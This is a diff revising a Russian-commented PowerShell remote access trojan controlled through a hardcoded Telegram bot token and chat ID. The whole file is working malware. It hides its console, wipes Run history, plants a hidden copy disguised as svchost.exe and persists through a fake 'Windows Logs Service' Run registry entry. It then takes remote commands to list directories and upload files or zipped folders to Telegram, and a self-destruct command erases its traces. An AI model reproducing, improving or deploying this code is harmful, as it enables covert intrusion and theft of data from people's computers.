@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - ПОЛНОСТЬЮ СКРЫТАЯ ВЕРСИЯ
+# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -11,30 +11,17 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# ПОЛНОЕ СКРЫТИЕ ОКНА - запускаем новый скрытый процесс и завершаем текущий
-if (-not $global:Restarted) {
-    $global:Restarted = $true
-    
-    # Сохраняем скрипт во временный файл
-    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-    $currentContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
-    $currentContent | Out-File -FilePath $tempScript -Encoding UTF8
-    
-    # Запускаем новый полностью скрытый процесс
-    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processStartInfo.FileName = "powershell.exe"
-    $processStartInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
-    $processStartInfo.CreateNoWindow = $true
-    $processStartInfo.UseShellExecute = $false
-    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    
-    $process = New-Object System.Diagnostics.Process
-    $process.StartInfo = $processStartInfo
-    $process.Start() | Out-Null
-    
-    # Завершаем текущий видимый процесс
-    exit
-}
+# Скрытие окна PowerShell
+try {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    [Console.Window]::ShowWindow($consolePtr, 0)
+} catch { }
 
 # Очистка истории RUN при запуске
 try {
@@ -56,7 +43,7 @@ function Send-Telegram {
     }
     
     try {
-        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing
     } catch { 
         # Молча игнорируем ошибки отправки
     }
@@ -73,24 +60,12 @@ function Send-TelegramFile {
     $url = "https://api.telegram.org/bot$Token/sendDocument"
     
     try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-        $boundary = [System.Guid]::NewGuid().ToString()
-
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            $ChatID,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            $fileEnc,
-            "--$boundary--"
-        ) -join "`r`n"
-
-        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
+        $fileInfo = Get-Item $FilePath
+        $form = @{
+            chat_id = $ChatID
+            document = $fileInfo
+        }
+        Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
     } catch {
         # Молча игнорируем ошибки отправки файлов
     }
@@ -225,9 +200,8 @@ if (!(Test-Path $installMarker)) {
     
     $scriptPath = "$hiddenFolder\svchost.exe"
     
-    # Сохраняем текущий скрипт в новое место
-    $currentScriptContent = @'
-# RAT через Telegram Bot - СКРЫТАЯ ВЕРСИЯ
+    # Сохраняем упрощенную версию скрипта для автозагрузки
+    $simpleScript = @'
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -238,133 +212,55 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# Очистка истории RUN
 try {
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    [Console.Window]::ShowWindow($consolePtr, 0)
 } catch { }
 
-function Send-Telegram {
-    param([string]$Message, [string]$FilePath = $null)
-    
-    $lastMessage = $global:LastSentMessage
-    if ($Message -eq $lastMessage) { return }
-    $global:LastSentMessage = $Message
-    
+function Send-Telegram($Message, $FilePath = $null) {
     $url = "https://api.telegram.org/bot$Token/sendMessage"
-    $body = @{ chat_id = $ChatID; text = $Message }
-    
-    try {
-        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
-    } catch { }
-    
-    if ($FilePath -and (Test-Path $FilePath)) {
-        Send-TelegramFile -FilePath $FilePath
-    }
+    $body = @{chat_id = $ChatID; text = $Message}
+    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null } catch { }
 }
 
-function Send-TelegramFile {
-    param([string]$FilePath)
-    
+function Send-TelegramFile($FilePath) {
     $url = "https://api.telegram.org/bot$Token/sendDocument"
-    
     try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-        $boundary = [System.Guid]::NewGuid().ToString()
-
-        $bodyLines = (
-            "--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $ChatID,
-            "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
-            "Content-Type: application/octet-stream", "", $fileEnc, "--$boundary--"
-        ) -join "`r`n"
-
-        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
+        $fileInfo = Get-Item $FilePath
+        $form = @{chat_id = $ChatID; document = $fileInfo}
+        Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
     } catch { }
 }
 
-function Compress-Folder {
-    param([string]$FolderPath, [string]$ZipPath)
+function Compress-Folder($FolderPath, $ZipPath) {
     try {
         [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
         return $true
     } catch { return $false }
 }
 
-function Invoke-Cleanup {
-    Send-Telegram "🔍 Начинается полная очистка RAT..."
-    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"
-
-    $processes = Get-Process | Where-Object { $_.ProcessName -eq "powershell" -or $_.ProcessName -eq "pwsh" -or $_.ProcessName -eq "cmd" }
-    foreach ($process in $processes) {
-        try {
-            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
-            if ($cmdLine -like "*8429674512*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*svchost.exe*") {
-                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
-            }
-        } catch { }
-    }
-
-    $filesToDelete = @(
-        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
-        "$env:TEMP\windows_update.marker"
-    )
-
-    $deletedFiles = @()
-    foreach ($filePattern in $filesToDelete) {
-        try {
-            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
-                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                $deletedFiles += $_.FullName
-            }
-        } catch { }
-    }
-
-    $regPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
-    $regEntries = @()
-    foreach ($regPath in $regPaths) {
-        try {
-            Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
-            $regEntries += "$regPath\Windows Logs Service"
-        } catch { }
-    }
-
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-
-    $report = "✅ ОЧИСТКА RAT ЗАВЕРШЕНА`nУдаленные файлы:`n$($deletedFiles -join "`n")`nУдаленные записи реестра:`n$($regEntries -join "`n")"
-    Send-Telegram $report
-    return $true
-}
-
-# Основные переменные
 $currentDir = "C:\"
-$global:LastSentMessage = ""
-$global:LastUpdateId = 0
+$LastSentMessage = ""
+$LastUpdateId = 0
 
-# Очистка истории сообщений
-try {
-    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
-    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
-} catch { }
-
-Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help - список команд`n/ls - список файлов`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл`n/destroy - самоуничтожение"
+Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help`n/ls`n/cd [папка]`n/download [файл]`n/destroy"
 
 while ($true) {
     try {
-        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
-        
+        $offset = if ($LastUpdateId) { $LastUpdateId + 1 } else { 0 }
+        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -UseBasicParsing
         if ($updates.ok -and $updates.result.Count -gt 0) {
             foreach ($update in $updates.result) {
-                $global:LastUpdateId = $update.update_id
-                
+                $LastUpdateId = $update.update_id
                 if ($update.message.chat.id -eq $ChatID) {
                     $command = $update.message.text
-                    
                     switch -regex ($command) {
-                        "^/help$" {
-                            Send-Telegram "Доступные команды:`n/help - показать это сообщение`n/ls - список файлов в текущей директории`n/cd [папка] - сменить директорию`n/download [файл] - скачать файл или папку`n/destroy - самоуничтожение RAT"
-                        }
-                        "^/ls$" {
+                        "^/help$" { Send-Telegram "Команды:`n/help`n/ls`n/cd [папка]`n/download [файл]`n/destroy" }
+                        "^/ls$" { 
                             $items = Get-ChildItem -Path $currentDir -Force
                             $fileList = @()
                             foreach ($item in $items) {
@@ -388,7 +284,6 @@ while ($true) {
                                     continue
                                 }
                             }
-                            
                             $items = Get-ChildItem -Path $currentDir -Force
                             $fileList = @()
                             foreach ($item in $items) {
@@ -401,15 +296,14 @@ while ($true) {
                         "^/download (.+)$" {
                             $target = $matches[1].Trim()
                             $fullPath = Join-Path $currentDir $target
-                            
                             if (Test-Path $fullPath) {
                                 if (Test-Path $fullPath -PathType Container) {
                                     $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                     if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                         Send-Telegram "Папка $target заархивирована" $zipPath
-                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                                        Remove-Item $zipPath -Force
                                     } else {
-                                        Send-Telegram "Ошибка архивации папки: $target"
+                                        Send-Telegram "Ошибка архивации: $target"
                                     }
                                 } else {
                                     Send-Telegram "Файл $target отправлен" $fullPath
@@ -419,32 +313,26 @@ while ($true) {
                             }
                         }
                         "^/destroy$" {
-                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
+                            Send-Telegram "🔄 Самоуничтожение..."
                             try {
-                                $cleanupResult = Invoke-Cleanup
-                                if ($cleanupResult) {
-                                    Start-Sleep -Seconds 3
-                                    Stop-Process -Id $pid -Force
-                                }
-                            } catch {
-                                Send-Telegram "❌ Ошибка при самоуничтожении"
-                                try {
-                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-                                    Stop-Process -Id $pid -Force
-                                } catch { }
-                            }
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
+                                Remove-Item "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe" -Force -ErrorAction SilentlyContinue
+                                Remove-Item "$env:TEMP\windows_update.marker" -Force -ErrorAction SilentlyContinue
+                                Send-Telegram "✅ RAT уничтожен"
+                                Stop-Process -Id $pid -Force
+                            } catch { Stop-Process -Id $pid -Force }
                         }
                     }
                 }
             }
         }
-    } catch { 
-        Start-Sleep -Seconds 5
-    }
+    } catch { }
+    Start-Sleep -Seconds 2
 }
 '@
 
-    $currentScriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+    $simpleScript | Out-File -FilePath $scriptPath -Encoding UTF8
     attrib +h "$scriptPath" 2>&1 | Out-Null
 }
 
@@ -459,12 +347,6 @@ Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyl
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 $global:LastUpdateId = 0
-
-# Очистка истории сообщений при запуске
-try {
-    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
-    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
-} catch { }
 
 # Отправка информации о запуске
 Send-Telegram "RAT активирован на $env:COMPUTERNAME
@@ -558,29 +440,18 @@ $($fileList -join "`n")"
                         }
                         "^/destroy$" {
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
-                            
                             try {
-                                # Запускаем встроенную функцию очистки
                                 $cleanupResult = Invoke-Cleanup
-                                
                                 if ($cleanupResult) {
-                                    # Даем время на отправку финального сообщения
                                     Start-Sleep -Seconds 3
-                                    
-                                    # Завершаем текущий процесс
                                     Stop-Process -Id $pid -Force
                                 }
-                                
                             } catch {
-                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
-                                
-                                # Аварийная очистка
+                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                 try {
                                     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                     Stop-Process -Id $pid -Force
-                                } catch {
-                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
-                                }
+                                } catch { }
                             }
                         }
                     }
